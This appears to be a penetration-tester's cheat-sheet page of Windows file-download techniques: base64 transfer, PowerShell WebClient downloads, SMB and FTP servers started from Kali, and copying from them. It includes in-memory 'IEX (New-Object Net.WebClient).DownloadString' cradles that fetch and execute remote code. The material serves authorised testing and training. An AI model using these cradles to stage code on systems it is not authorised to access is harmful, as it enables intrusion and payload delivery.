---
description: Windows file transfer download techniques
layout:
  width: default
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Windows File Download

## Powershell

### Powershell Base64 Encode/Decode

#### Encode

```bash
$ cat <FILE> | base64 -w 0; echo
```

#### Decode

{% code overflow="wrap" fullWidth="false" %}
```powershell
PS C:\> [IO.File]::WriteAllBytes("<SAVE PATH>", [Convert]::FromBase64String("<Base64 String>"))
```
{% endcode %}

### Powershell Web Download

{% code overflow="wrap" %}
```powershell
PS C:\> (New-Object Net.WebClient).DownloadFile('<REMOTE FILE>','LOCAL FILE>')
```
{% endcode %}

### Powershell Web Download - In Memory

{% code overflow="wrap" %}
```powershell
IEX (New-Object Net.WebClient).DownloadString('<FILE>')
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
PS C:\> (New-Object Net.WebClient).DownloadString('<FILE>') | IEX
```
{% endcode %}

## SMB

### Starting SMB Server From Kali

```bash
$ sudo impacket-smbserver share -smb2support /tmp/smb
```

```bash
$ sudo impacket-smbserver share -smb2support /tmp/smb -user test -password test
```

### Copy File From SMB Server

```batch
net use n: \\<IP>\<Share> /user:<USER> <PASS>
```

```batch
C:\> copy \\<IP>\<SHARE>\<FILE>
```

## FTP

### Starting FTP Server From Kali

```bash
$ sudo python3 -m pyftpdlib --port 21
```

### Copy File From FTP Server

{% code overflow="wrap" %}
```powershell
PS C:\> (New-Object Net.WebClient).DownloadFile('ftp://<IP>/<FILE>', '<LOCAL FILE>')
```
{% endcode %}
